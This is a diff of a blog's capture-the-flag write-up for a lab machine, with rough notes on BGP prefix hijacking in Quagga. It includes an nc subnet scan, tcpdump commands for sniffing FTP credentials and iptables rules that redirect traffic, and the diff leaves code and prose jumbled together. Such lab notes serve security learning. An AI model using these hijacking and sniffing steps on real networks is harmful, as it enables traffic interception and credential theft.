@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-07-21T18:21:39 EDT">
+<meta name="revised" content="2019-07-22T21:23:04 EDT">
 <title>Carrier :: Pwny_Sec</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -977,15 +977,16 @@ Routing entry for 10.120.15.0/24
 
 <ul>
 <li>10.78.11.2, via eth2</li>
-<li>
-```</li>
+
+<li><pre><code>
+### Router# show running-config
+
+</code></pre></li>
 </ul>
 
-<h3 id="router-show-running-config">Router# show running-config</h3>
+<p>show running-config</p>
 
-<pre><code>show running-config
-    
-Current configuration:
+<p>Current configuration:
 !
 hostname Router
 password zebra
@@ -1005,122 +1006,151 @@ route-map to-as200 permit 10
 !
 route-map to-as300 ermit 10
 !
-line vty
+line vty</p>
+
+<pre><code>
+
+#### arp
+
 </code></pre></li>
 </ul>
 
-<h4 id="arp">arp</h4>
-
-<pre><code>Address                  HWtype  HWaddress           Flags Mask            Iface
+<p>Address                  HWtype  HWaddress           Flags Mask            Iface
 10.99.64.251             ether   00:16:3e:f3:92:14   C                     eth0
 10.78.10.2               ether   00:16:3e:5b:49:a9   C                     eth1
 10.78.11.2               ether   00:16:3e:c4:fa:83   C                     eth2
-10.99.64.1               ether   fe:30:d6:a4:df:a0   C                     eth0
+10.99.64.1               ether   fe:30:d6:a4:df:a0   C                     eth0</p>
 
-sweet the addresses needed or are theses the address I set. i believe i only need to change the route metric of one of the addresses. 
+<p>sweet the addresses needed or are theses the address I set. i believe i only need to change the route metric of one of the addresses.</p>
 
-BGP COMMANDS
+<p>BGP COMMANDS</p>
+
+<pre><code>
+
+
+### summary of tickets 
+
+3#  Day 5 customers experience lag
+
+5#  Day unknown a customer calls to report some kind of  CVE maybe bgp hijacking. CVE 
+
+6#  Day 38 Castcom calls to report routes being leaked due to &quot;misconfiguration&quot;. Mike D.was terminated
+
+7#  Day 40 Castcom still reporting issues with 10.120.15.0/24 10.120.16.0/24 10.120.17.0/24
+
+8#  Day 41 Somebody cleared the routes after the leak, fixed by clearing config files. 
+
+arp request can't find local address same subnet, changing 
+
+Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.17/24's, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating... Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.
+
+
+
+THE ABOVE IS FROM THE WEBPAGE TICKETS found the network i need to connect to.
+
+setting up bgp and zebra
+
 </code></pre>
 
-<h3 id="summary-of-tickets">summary of tickets</h3>
-
-<p>3#  Day 5 customers experience lag</p>
-
-<p>5#  Day unknown a customer calls to report some kind of  CVE maybe bgp hijacking. CVE</p>
-
-<p>6#  Day 38 Castcom calls to report routes being leaked due to &ldquo;misconfiguration&rdquo;. Mike D.was terminated</p>
-
-<p>7#  Day 40 Castcom still reporting issues with 10.120.15.0/24 10.120.16.0/24 10.120.17.0/24</p>
-
-<p>8#  Day 41 Somebody cleared the routes after the leak, fixed by clearing config files.</p>
-
-<p>arp request can&rsquo;t find local address same subnet, changing</p>
-
-<p>Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.<sup>17</sup>&frasl;<sub>24</sub>&rsquo;s, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating&hellip; Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.</p>
-
-<p>THE ABOVE IS FROM THE WEBPAGE TICKETS found the network i need to connect to.</p>
-
-<p>setting up bgp and zebra</p>
-
-<pre><code>echo &quot;
+<p>echo &ldquo;
 !
 hostname Router
 password zebra
 enable password zebra
 !
-&quot; &gt;&gt; zebra.conf.orig
+&ldquo; &gt;&gt; zebra.conf.orig</p>
+
+<pre><code>
+copy zebra.conf.orgin into zebra.conf restart quagga
+
 </code></pre>
 
-<p>copy zebra.conf.orgin into zebra.conf restart quagga</p>
+<p>cp zebra.conf.orig zebra.conf</p>
 
-<pre><code>cp zebra.conf.orig zebra.conf
+<pre><code>
+ restart quagga for the changes to take effect.
+
 </code></pre>
 
-<p>restart quagga for the changes to take effect.</p>
+<p>/etc/init.d/quagga restart</p>
 
-<pre><code>/etc/init.d/quagga restart
+<pre><code>
+then telnet into zebra the router. i mistakenly used zebra for the bgp changes.  yikes. -l username
+
+&lt;div class=&quot;notices warning&quot; &gt;
+ [ZEBRA] Unknown command: router bgp autonomous-system &lt;/div&gt;
+%
+
 </code></pre>
 
-<p>then telnet into zebra the router. i mistakenly used zebra for the bgp changes.  yikes. -l username</p>
+<p>telnet localhost zebra</p>
 
-<p><div class="notices warning" ><p>[ZEBRA] Unknown command: router bgp autonomous-system</p>
-</div>
-%</p>
-
-<pre><code>telnet localhost zebra
+<pre><code>
 </code></pre>
 
-<pre><code>echo &quot;
+<p>echo &ldquo;
 !
 hostname Router
 password zebra
 enable password zebra
 !
-&quot; &gt;&gt; bgpd.conf.orig
+&ldquo; &gt;&gt; bgpd.conf.orig</p>
+
+<pre><code>
+&lt;div class=&quot;notices warning&quot; &gt;Restart is not requeired&lt;/div&gt;
+%
+
 </code></pre>
 
-<p><div class="notices warning" >Restart is not requeired</div>
-%</p>
+<p>cp bgpd.conf.orig bgpd.conf</p>
 
-<pre><code>cp bgpd.conf.orig bgpd.conf
+<pre><code>
+Then telnet into bgp deamon -l username
+
 </code></pre>
 
-<p>Then telnet into bgp deamon -l username</p>
+<p>telnet localhost bgpd -l zebra</p>
 
-<pre><code>telnet localhost bgpd -l zebra
+<pre><code>
+&lt;div class=&quot;notices tip&quot; &gt;Escape character is '^]'.
+
+Hello, this is Quagga (version 0.99.24.1).
+Copyright 1996-2005 Kunihiro Ishiguro, et al. &lt;/div&gt;
+
+
+first step defining the autonomous systems.
+
 </code></pre>
 
-<div class="notices tip" ><p>Escape character is &lsquo;^]&rsquo;.</p>
-
-<p>Hello, this is Quagga (version 0.99.24.1).
-Copyright 1996-2005 Kunihiro Ishiguro, et al.</p>
-</div>
-
-
-<p>first step defining the autonomous systems.</p>
-
-<pre><code>en      - enable // enter PASS: zebra
+<p>en      - enable // enter PASS: zebra
 config terminal
-route-map MYMAP permit 10 changes the hop count
+route-map MYMAP permit 10 changes the hop count</p>
+
+<pre><code>
+##  sh ip bgp
+
+finding neighbors router#
 
 </code></pre>
 
-<h2 id="sh-ip-bgp">sh ip bgp</h2>
+<p>sh ip bgp</p>
 
-<p>finding neighbors router#</p>
+<pre><code>
+![10.route](https://chickenpwny.github.io/images/carrier/route.PNG)
 
-<pre><code>sh ip bgp
+interesting in the above after messing with it for awhile 
+
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/carrier/route.PNG" alt="10.route" /></p>
+<p>10.120.15.0/24   10.78.10.2                             0 200 300 i
+*&gt;                          10.78.11.2               0            0        300 i</p>
 
-<p>interesting in the above after messing with it for awhile</p>
+<pre><code>
 
-<pre><code>10.120.15.0/24   10.78.10.2                             0 200 300 i
-*&gt;                          10.78.11.2               0            0        300 i
+
 </code></pre>
 
-<pre><code>sh ip bgp 10.120.15.0
+<p>sh ip bgp 10.120.15.0
 sh ip bgp 10.120.15.0
 BGP routing table entry for 10.120.15.0/24
 Paths: (2 available, best #2, table Default-IP-Routing-Table)
@@ -1129,20 +1159,26 @@ Paths: (2 available, best #2, table Default-IP-Routing-Table)
   200 300
     10.78.10.2 from 10.78.10.2 (10.255.255.2)
       Origin IGP, localpref 100, valid, external
-      Last update: Wed Jan  9 03:22:08 2019
+      Last update: Wed Jan  9 03:22:08 2019</p>
 
-  Local
+<p>Local
     0.0.0.0 from 0.0.0.0 (10.255.255.1)
       Origin incomplete, metric 0, localpref 100, weight 32768, valid, sourced, best
-      Last update: Wed Jan  9 03:20:06 2019
+      Last update: Wed Jan  9 03:20:06 2019</p>
+
+<pre><code>
+
+
 </code></pre>
 
-<pre><code>BGP neighbor is 10.78.10.2, remote AS 200, local AS 100, external link
-  BGP version 4, remote router ID 10.255.255.2     
-  BGP state = Established, up for 00:04:02 
+<p>BGP neighbor is 10.78.10.2, remote AS 200, local AS 100, external link
+  BGP version 4, remote router ID 10.255.255.2<br />
+  BGP state = Established, up for 00:04:02</p>
+
+<pre><code>
 </code></pre>
 
-<pre><code>Connections established 1; dropped 0
+<p>Connections established 1; dropped 0
   Last reset never
 Local host: 10.78.10.1, Local port: 179
 Foreign host: 10.78.10.2, Foreign port: 54702
@@ -1150,197 +1186,215 @@ Nexthop: 10.78.10.1
 Nexthop global: fe80::216:3eff:fe8a:f24f
 Nexthop local: ::
 BGP connection: non shared network
-Read thread: on  Write thread: off
+Read thread: on  Write thread: off</p>
 
-BGP neighbor is 10.78.11.2, remote AS 300, local AS 100, external link
+<p>BGP neighbor is 10.78.11.2, remote AS 300, local AS 100, external link
   BGP version 4, remote router ID 0.0.0.0
   BGP state = Active
   Last read 00:04:11, hold time is 180, keepalive interval is 60 seconds
   Message statistics:
-   Inq depth is 0
+   Inq depth is 0</p>
+
+<pre><code>
 </code></pre>
 
-<pre><code>sudo iptables -t nat -F
-sudo iptables -t nat -A PREROUTING -d 10.78.11.2 -m ttl --ttl-gt 1 -j NETMAP --to 10.120.15.1
-sudo iptables -t nat -A POSTROUTING -s 10.120.15.1 -j NETMAP --to 10.78.11.2
+<p>sudo iptables -t nat -F
+sudo iptables -t nat -A PREROUTING -d 10.78.11.2 -m ttl &ndash;ttl-gt 1 -j NETMAP &ndash;to 10.120.15.1
+sudo iptables -t nat -A POSTROUTING -s 10.120.15.1 -j NETMAP &ndash;to 10.78.11.2</p>
+
+<pre><code>
+in zebra 
+
+en 
+
+interface eth3
+
+tracepath is for linxu traceroute is for windows duh
+
+### tracepath 10.120.15.10
+why does the local ip repeat? &quot;symptom of suboptimal route or load-sharing&quot; troubleshooting next-hop table particular route-map/PBR/filters applied to the ip. show cdp neighbor. 
+
 </code></pre>
 
-<p>in zebra</p>
-
-<p>en</p>
-
-<p>interface eth3</p>
-
-<p>tracepath is for linxu traceroute is for windows duh</p>
-
-<h3 id="tracepath-10-120-15-10">tracepath 10.120.15.10</h3>
-
-<p>why does the local ip repeat? &ldquo;symptom of suboptimal route or load-sharing&rdquo; troubleshooting next-hop table particular route-map/PBR/filters applied to the ip. show cdp neighbor.</p>
-
-<pre><code> 1?: [LOCALHOST]                                         pmtu 1500
- 1:  10.78.11.2                                            0.053ms 
- 1:  10.78.11.2                                            0.021ms 
+<p>1?: [LOCALHOST]                                         pmtu 1500
+ 1:  10.78.11.2                                            0.053ms
+ 1:  10.78.11.2                                            0.021ms
  2:  10.120.15.10                                          0.055ms reached
-  Resume: pmtu 1500 hops 2 back 2 
+  Resume: pmtu 1500 hops 2 back 2</p>
 
- ftp 10.120.15.10
+<p>ftp 10.120.15.10</p>
 
-Login failed.
+<p>Login failed.</p>
+
+<pre><code>
+TRYING TO UNDERSTAND BGP NEIGHBORS
+
+to enable a tcp connection between two routers they need to neighbors enorder to echange route tables. 
+
+en
+
+cronfig terminal
+
+interface eth2
+
+ **clear ip bgp address**  
+
+ **Note:** The  **address**  is the neighbor address.
+
+ **clear ip bgp \*** 
+
+neighbor 10.120.15.10 remote-as 300
+
+ neighbor 10.120.15.1 remote-as 400
+
+network 10.120.0.0/16
+
 </code></pre>
 
-<p>TRYING TO UNDERSTAND BGP NEIGHBORS</p>
+<p>NOPE
+RTB#
+     router bgp 100
+     neighbor 10.120.15.10 remote-as 300</p>
 
-<p>to enable a tcp connection between two routers they need to neighbors enorder to echange route tables.</p>
+<pre><code>
+FTP 
 
-<p>en</p>
+ftp 10.120.15.10 doesn't work hangs
 
-<p>cronfig terminal</p>
+telnet 10.120.15.10 21 
 
-<p>interface eth2</p>
+user anonymous
 
-<p><strong>clear ip bgp address</strong></p>
+pass anonymous
 
-<p><strong>Note:</strong> The  <strong>address</strong>  is the neighbor address.</p>
+login successful
 
-<p><strong>clear ip bgp *</strong></p>
-
-<p>neighbor 10.120.15.10 remote-as 300</p>
-
-<p>neighbor 10.120.15.1 remote-as 400</p>
-
-<p>network 10.120.0.0/16</p>
-
-<pre><code>NOPE
-RTB# 
-     router bgp 100 
-     neighbor 10.120.15.10 remote-as 300
-</code></pre>
-
-<p>FTP</p>
-
-<p>ftp 10.120.15.10 doesn&rsquo;t work hangs</p>
-
-<p>telnet 10.120.15.10 21</p>
-
-<p>user anonymous</p>
-
-<p>pass anonymous</p>
-
-<p>login successful</p>
-
-<p>get root.txt
+get root.txt
 500 HTTP protocol commands not allowed.
-Connection closed by foreign host.</p>
+Connection closed by foreign host.
 
-<h3 id="11-capture-ftp-credentials-and-commands">11. Capture FTP Credentials and Commands</h3>
 
-<pre><code>for i in {1..254}; do nc -v -n -z -w 1 10.120.15.$i 21 |grep failed; done
+
+### 11. Capture FTP Credentials and Commands
+
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/carrier/ftp-confirmation.PNG" alt="ftp-confirmation" /></p>
+<p>for i in {1..254}; do nc -v -n -z -w 1 10.120.15.$i 21 |grep failed; done</p>
 
-<p>Capturing FTP commands and login details is straight forward. After the authentication is established an FTP session can be <strong>active</strong> or <strong>passive</strong>  this will determine whether the data part of the session is conducted  over TCP port 20 or another ephemeral port. With the following command  you will USER and PASS in the output (which could be fed to grep) as  well as the FTP commands such as LIST, CWD and PASSIVE.</p>
+<pre><code>
+![ftp-confirmation](https://chickenpwny.github.io/images/carrier/ftp-confirmation.PNG)
 
-<pre><code>:~$ sudo tcpdump -nn -v port ftp or ftp-data
+Capturing FTP commands and login details is straight forward. After the authentication is established an FTP session can be **active** or **passive**  this will determine whether the data part of the session is conducted  over TCP port 20 or another ephemeral port. With the following command  you will USER and PASS in the output (which could be fed to grep) as  well as the FTP commands such as LIST, CWD and PASSIVE.
+
 </code></pre>
 
-<pre><code>tl
+<p>:~$ sudo tcpdump -nn -v port ftp or ftp-data</p>
+
+<pre><code>
+</code></pre>
+
+<p>tl
 tcpdump -qns 0 -A -r lo.pcap
 tcpdump -i eth1 -vv -w eth1.pcap
 tcpdump -i any -vv -w any.pcap
 tcpdump -qns 0 -A -r eth1.pcap
 tcpdump -i eth2 -vv -w eth2.pcap
 tcpdump -qns 0 -A -r eth2.pcap
-tcpdump -qns 0 -A -r et2.pcap
+tcpdump -qns 0 -A -r et2.pcap</p>
 
--q -s snaplen -n number
+<p>-q -s snaplen -n number</p>
 
-trying to change the route-map
+<p>trying to change the route-map</p>
+
+<pre><code>
+tried redistributing the localhost, nothing different happened.  
+
+eth1
+
+Request who-has 10.78.10.2 tell 10.78.10.1, length 28 
+
+23:06:17.303676 ARP, Request who-has 10.78.10.1 tell 10.78.10.2, length 28                                    
+
+23:10:12.439816 IP 10.78.11.2.179 &gt; 10.78.11.1.35546: tcp 0
+
+eth2
+
+23:06:17.303680 ARP, Reply 10.78.10.1 is-at 00:16:3e:8a:f2:4f, length 28
+
+23:06:17.303694 ARP, Reply 10.78.10.2 is-at 00:16:3e:5b:49:a9, length 28                                     
+
+JESUS CHRIST
+
+so after reading the forums everybody says read about bgp leaks which would make since with what we know from the tickets. it's the same site from earlier where i tried to fix 10.120.15.11/24 network. And tpcdump shows 10.120.15.1 trying to talk around the network but it gets lost can bgp can't establish a connection. i need to fix 10.120.15.1/24        / 10.78.10.1/24     
+
+further more local address on eth1 can't talk to eth2 which is silly. they also tlak about loop back leaks but none of the stuff gives me anything i can use. 
+
+bgp hijacking not really hakcing your using existing features to make your rogue server the bees knees of routers so all the connection go through it. So to fix the problem or hijack it im not sure what my role is, guess im a hacker so getting ftp creds somehow or use anonymous. 
+
+bgp does not use authentication to verify routes. Any BGP router can steal any prefix or modify routes associated with the prefix. 
+
+subprefix the attack annouces a subprefix 10.120.15.1/24 compared to 10.120.0.1/16
+
+bgpp prefix hijacking is where you take control of a prefix or 10.1/8 
+
+![maps](https://chickenpwny.github.io/images/carrier/maps.png)
+
+### fail 4
+
 </code></pre>
 
-<p>tried redistributing the localhost, nothing different happened.</p>
+<p>neighbor 10.120.15.10 remote-as 100</p>
 
-<p>eth1</p>
+<p>neighbor 10.120.15.10 update-source eth0</p>
 
-<p>Request who-has 10.78.10.2 tell 10.78.10.1, length 28</p>
+<p>neighbor 10.120.15.10 update-source eth1</p>
 
-<p>23:06:17.303676 ARP, Request who-has 10.78.10.1 tell 10.78.10.2, length 28</p>
+<p>neighbor 10.120.15.10 update-source loopback</p>
 
-<p>23:10:12.439816 IP 10.78.11.2.179 &gt; 10.78.11.1.35546: tcp 0</p>
+<pre><code>
+# [OVERVIEW OF BGP](https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork)
 
-<p>eth2</p>
+Boarder Gateway Protocol uses TCP, on port 179. Allows you to create loop-free interdomain routing between ASs. The routers use an exterior gateway protocol to route or an interior gateway protocol. To find the shortest or best way to route information. This below is an overview of failures &amp; hopefully one success.
 
-<p>23:06:17.303680 ARP, Reply 10.78.10.1 is-at 00:16:3e:8a:f2:4f, length 28</p>
+## Failed[Aggregate-address 10.120.0.0 255.255.0.0](https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#cidragg)
 
-<p>23:06:17.303694 ARP, Reply 10.78.10.2 is-at 00:16:3e:5b:49:a9, length 28</p>
+This helps keep routing tables a little bit cleaner. Aggregation combines multiple routes into one single route. I believe in the context of bgp highjacking this might allow all the traffic to go to me. 
 
-<p>JESUS CHRIST</p>
+ [![bgp-toc26.gif](https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc26.gif)](https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc26.gif) 
 
-<p>so after reading the forums everybody says read about bgp leaks which would make since with what we know from the tickets. it&rsquo;s the same site from earlier where i tried to fix 10.120.15.<sup>11</sup>&frasl;<sub>24</sub> network. And tpcdump shows 10.120.15.1 trying to talk around the network but it gets lost can bgp can&rsquo;t establish a connection. i need to fix 10.120.15.<sup>1</sup>&frasl;<sub>24</sub>        / 10.78.10.<sup>1</sup>&frasl;<sub>24</sub></p>
-
-<p>further more local address on eth1 can&rsquo;t talk to eth2 which is silly. they also tlak about loop back leaks but none of the stuff gives me anything i can use.</p>
-
-<p>bgp hijacking not really hakcing your using existing features to make your rogue server the bees knees of routers so all the connection go through it. So to fix the problem or hijack it im not sure what my role is, guess im a hacker so getting ftp creds somehow or use anonymous.</p>
-
-<p>bgp does not use authentication to verify routes. Any BGP router can steal any prefix or modify routes associated with the prefix.</p>
-
-<p>subprefix the attack annouces a subprefix 10.120.15.<sup>1</sup>&frasl;<sub>24</sub> compared to 10.120.0.<sup>1</sup>&frasl;<sub>16</sub></p>
-
-<p>bgpp prefix hijacking is where you take control of a prefix or 10.<sup>1</sup>&frasl;<sub>8</sub></p>
-
-<p><img src="https://chickenpwny.github.io/images/carrier/maps.png" alt="maps" /></p>
-
-<h3 id="fail-4">fail 4</h3>
-
-<pre><code>neighbor 10.120.15.10 remote-as 100
-
-neighbor 10.120.15.10 update-source eth0
-
-neighbor 10.120.15.10 update-source eth1
-
-neighbor 10.120.15.10 update-source loopback
 </code></pre>
 
-<h1 id="overview-of-bgp-https-www-cisco-com-c-en-us-support-docs-ip-border-gateway-protocol-bgp-26634-bgp-toc-html-howbgpwork"><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork">OVERVIEW OF BGP</a></h1>
-
-<p>Boarder Gateway Protocol uses TCP, on port 179. Allows you to create loop-free interdomain routing between ASs. The routers use an exterior gateway protocol to route or an interior gateway protocol. To find the shortest or best way to route information. This below is an overview of failures &amp; hopefully one success.</p>
-
-<h2 id="failed-aggregate-address-10-120-0-0-255-255-0-0-https-www-cisco-com-c-en-us-support-docs-ip-border-gateway-protocol-bgp-26634-bgp-toc-html-cidragg">Failed<a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#cidragg">Aggregate-address 10.120.0.0 255.255.0.0</a></h2>
-
-<p>This helps keep routing tables a little bit cleaner. Aggregation combines multiple routes into one single route. I believe in the context of bgp highjacking this might allow all the traffic to go to me.</p>
-
-<p><a href="https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc26.gif"><img src="https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc26.gif" alt="bgp-toc26.gif" /></a></p>
-
-<pre><code>try1
+<p>try1
 neighbor 10.120.15.1 remote-as 300
 neigbor 10.100.10.1 remote-as 100
 network 10.120.0.0
 aggregate-address 10.120.0.0 255.255.0.0
 try2
 neighbor 10.120.15.1 remote-as 300
-neighbor 10.100.10.0 remote-as 200          
-neighbor 10.120.0.0 remote-as 300       
-neighbor 10.100.0.0 remote-as 200
+neighbor 10.100.10.0 remote-as 200<br />
+neighbor 10.120.0.0 remote-as 300<br />
+neighbor 10.100.0.0 remote-as 200</p>
 
-network 10.120.15.0       
-netowrk 10.100.0.0   
+<p>network 10.120.15.0<br />
+netowrk 10.100.0.0</p>
+
+<pre><code>
+#### Failed - Suppressing more-specific routes
+
+this fails because ip route 10.120.0.0 255.255.0.0 null0 produces unknown command.
+
+in this senario you ahve three routers as 100 as 300 as 200 the goal is to change the prifix of as 200 to a less speicfic prefix 160.0.0.0. there are some problems doing this i dont fully understand but the work around is using static routes and redistribute into bgp.
+
+Neighbors are routers that have asstablished a connection and share route information. 
+
+ [![bgp-toc27.gif](https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc27.gif)](https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc27.gif) 
 
 </code></pre>
 
-<h4 id="failed-suppressing-more-specific-routes">Failed - Suppressing more-specific routes</h4>
-
-<p>this fails because ip route 10.120.0.0 255.255.0.0 null0 produces unknown command.</p>
-
-<p>in this senario you ahve three routers as 100 as 300 as 200 the goal is to change the prifix of as 200 to a less speicfic prefix 160.0.0.0. there are some problems doing this i dont fully understand but the work around is using static routes and redistribute into bgp.</p>
-
-<p>Neighbors are routers that have asstablished a connection and share route information.</p>
-
-<p><a href="https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc27.gif"><img src="https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc27.gif" alt="bgp-toc27.gif" /></a></p>
-
-<pre><code>network 10.120.0.0 mask 255.255.0.0  
-neighbor 10.100.0.0 remote-as 200            
+<p>network 10.120.0.0 mask 255.255.0.0<br />
+neighbor 10.100.0.0 remote-as 200<br />
 redistribute static
-ip route 10.120.0.0 255.255.0.0 null0       
+ip route 10.120.0.0 255.255.0.0 null0<br />
 try 2
 neighbor 10.100.0.0 remote-as 200
 neighbor 10.120.0.0 remote-as 300
@@ -1350,405 +1404,448 @@ try 3
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 network 10.120.0.0/16
-redistribute static
+redistribute static</p>
+
+<pre><code>
+[NEIGHBOR COMMAND](https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#networkcommand)
+
+the neighbor command establish a tcp connection to update routing tables to other autonomous systems.
+
+**Note:** You do not need network 150.10.0.0 or network 160.10.0.0 in
+RTC unless you want RTC to generate these networks as well as pass on 
+these networks as they come in from AS100 and AS200. Again, the 
+difference is that the **network** command adds an extra advertisement for these same networks, which indicates that AS300 is also an origin for these routes. 
+
+i believe this is apart of what i need to do, i need to make this route prefered over as 200 to as 300
+
+i want as 200 to as 100 to as 300
+
+this attemped tried to hijack the prefix 10.120.15 
 
 </code></pre>
-
-<p><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#networkcommand">NEIGHBOR COMMAND</a></p>
-
-<p>the neighbor command establish a tcp connection to update routing tables to other autonomous systems.</p>
-
-<p><strong>Note:</strong> You do not need network 150.10.0.0 or network 160.10.0.0 in
-RTC unless you want RTC to generate these networks as well as pass on
-these networks as they come in from AS100 and AS200. Again, the
-difference is that the <strong>network</strong> command adds an extra advertisement for these same networks, which indicates that AS300 is also an origin for these routes.</p>
-
-<p>i believe this is apart of what i need to do, i need to make this route prefered over as 200 to as 300</p>
-
-<p>i want as 200 to as 100 to as 300</p>
-
-<p>this attemped tried to hijack the prefix 10.120.15</p>
-
-<pre><code>neighbor 10.120.15.1 remote-as 300
-
-neighbor 10.100.0.0 remote-as 200
-
-network 10.120.15.0 mask 255.255.255.0
-
-
-</code></pre>
-
-<h2 id="as-path">AS_PATH</h2>
-
-<p>attribute is the list of as number a route has traversed to its destination for as 100 to talk to as 300 it goes through as 200. when it arrives at 300 it looks like 10.120.0.0(300,200) it inverts the as&rsquo;s to know how to get back. note</p>
-
-<p><img src="https://chickenpwny.github.io/images/carrier/route2.PNG" alt="route2" /></p>
-
-<h2 id="next-hop-attribute">Next hop attribute</h2>
-
-<p>Ebgp whats used for AS to route in between other ASs. This allows you to spefify the next hop is within that AS. so you can switch over to ibgp and talk to the next router inside there. hmmm interesting. i dont think its applicaable to this ctf as each of the target routers are in different AS.</p>
-
-<p>BGP Backdoor</p>
-
-<p>eBGP has a distance of 20</p>
-
-<p>distance bgp <em>external-distance internal-distance local-distance</em></p>
-
-<p>distance bgp 20</p>
-
-<p>AS 200 routes directly to AS 300 because thats the shortest path and there for preferred. I want it to go 200 to 100 to 300. distance bgp command to edit the prefered route. this is what i need to get ftp creds. This may not be the way im not sure what kind of internal gateway protocol is being used. Nevermind found it<img src="https://chickenpwny.github.io/images/carrier/igp.PNG" alt="igp" /></p>
-
-<p>one thing that makes this option finicky is that i dont have access to internal gateway protocol. I can only us router bgp. Based on my understand I should be able to bypass this by using the backdoor command.</p>
 
 <p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>network 10.120.15.1 backdoor</p>
-
-<p>fail</p>
-
-<h2 id="synchronization">Synchronization</h2>
-
-<p>network 10.100.0.0</p>
-
-<p>neighbor 10.120.15.10 remote-as 300</p>
-
-<p>NOTE: This is all about ebgp</p>
-
-<p>no synchronization</p>
-
-<h2 id="weight-attributes">Weight Attributes</h2>
-
-<p>Weight attributes os a cisco-defined attribute hmm. This effects how the router will handle priority with routes. Other paths have a default of zero. Weights range from 0 to 65,535 Default is 32768 (sh ip bgp). routes with higher weights have preference. I don&rsquo;t have access to the router to effect theses changes. which is why i think the attemp with editing the weight attribute failed. This is used when you have two equally awesome routes to take and you need to chooses the preferred way. FOR YOUR ROUTER. forted again.</p>
-
-<p>.<a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork">https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork</a></p>
-
-<p><img src="https://chickenpwny.github.io/images/carrier/metric.PNG" alt="metric" /></p>
-
-<p>neighbor 10.120.0.0 remote-as 300</p>
 
 <p>neighbor 10.100.0.0 remote-as 200</p>
 
-<p>neighbor 10.120.0.0 weight 200</p>
-
-<p>neighbor 10.100.0.0 weight 400</p>
-
-<h2 id="metric-attributes-https-www-cisco-com-c-en-us-support-docs-ip-border-gateway-protocol-bgp-26634-bgp-toc-html-howbgpwork"><a href="**https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork**">METRIC Attributes.</a></h2>
-
-<p>If there are two routers in the same autonoymous system using the mtric attribute will halp external neighbors know which is the prefered path to take. This is a IGBP not really what im looking for. upong rereading about metrics i found this</p>
-
-<p>&ldquo;The attribute provides a dynamic way to influence another AS in the way
-to reach a certain route when there are multiple entry points into that
-AS. A lower metric value is preferred more.</p>
-
-<p>Unlike local preference, metric is exchanged between ASs. A metric is carried into an AS but does not leave the AS. When an update enters the AS with a certain metric, that metric is used to make decisions inside the AS. When the same update passes on to a third AS, that metric returns to 0. The diagram in this section shows the set of metric. The metric default value is 0.&rdquo;</p>
-
-<p>So using route maps i could changes the preferences of as 200</p>
-
-<h2 id="route-filtering-https-www-cisco-com-c-en-us-support-docs-ip-border-gateway-protocol-bgp-26634-bgp-toc-html-howbgpwork"><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork">ROUTE FILTERING</a></h2>
-
-<p>Not it either this is used when you want to stop the propogation of route to another autonoymous system. fudge</p>
-
-<p><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp">https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp</a></p>
-
-<h2 id="well-well-well-peergroups">Well Well Well PEERGROUPS</h2>
-
-<p><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp">https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp</a></p>
-
-<p>After reading about peergroups the image form docs makes a little more sense.</p>
-
